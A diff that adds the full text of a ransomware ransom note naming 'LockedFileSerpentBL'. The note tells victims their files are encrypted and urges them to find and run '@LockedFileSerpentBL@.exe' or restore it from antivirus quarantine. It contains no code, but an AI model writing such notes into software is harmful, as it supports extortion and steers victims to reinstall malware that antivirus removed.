@@ -1,0 +1,9 @@
+ooops, your important files are encrypted.
+ıf you see this text, but don't the "LockedFileSerpentBL" window,then your
+antivirus removed the decrypt software or you deleted it from your computer 
+
+ıf you need your files you have to run the decrypt software.
+
+please find an application filed named "@LockedFileSerpentBL@.exe" in 
+any folder or restore from the antivirus quarantine 
+run and follow the instructions !
